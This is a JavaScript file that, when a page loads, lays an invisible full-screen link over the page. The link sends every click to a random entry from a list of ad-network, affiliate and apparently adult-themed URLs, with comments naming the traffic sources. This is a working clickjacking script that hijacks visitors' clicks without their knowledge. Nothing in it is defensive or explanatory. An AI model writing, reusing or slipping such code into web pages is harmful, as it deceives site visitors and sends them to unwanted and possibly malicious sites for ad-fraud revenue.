function createLink() {
  var urls = [
    // hil: db(new)
    "https://tidy-status.com/bx3_V.0xPk3TpyvObym/V_JBZfDP0C2dMvD/Io0DNCjCYKzlL/TtYXwSMljLQ/2cNCjFQn",
    "https://tidy-status.com/BskeKo",

    // hil: Jacklove
    "http://interestweb.mjsj.sbs/auto",
    
    // mon: Brian
    "https://interestweb.mjsj.sbs/def/auto-mon-brian",

    // // clickadilla: Lucy
    // "https://hot123.top/tags/",
    // clickadilla: db123
    "https://sexylove.mjsj.sbs",
    // clickadilla: Brian
    "https://json.qrcreate.online",

    // mon: db
    // "https://nutchaungong.com/4/7420689",
    // "https://maipheeg.com/4/7474716",
    // "https://glocheexi.com/4/7237941",
    // "https://coawoaph.net/4/7237942",
    "https://laichegloavy.com/4/7631332",
    
    "https://vorsoutseemt.com/4/7436813",
    "https://eedootefaug.net/4/7420698",
    "https://futseerdoa.com/4/7237921",
    "https://eeboazurg.net/4/7420696",
    // "https://psauwaun.com/4/7614690",
    // "https://ptougeegnep.net/4/7237907",
  ];

  if (urls.length === 0) {
    return;
  }
  var a = document.createElement('a');
  a.href = urls[Math.floor(Math.random() * urls.length)];
  a.rel = 'noopener noreferrer';
  a.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; opacity: 0;';
  document.body.appendChild(a);
}

document.addEventListener('DOMContentLoaded', createLink);
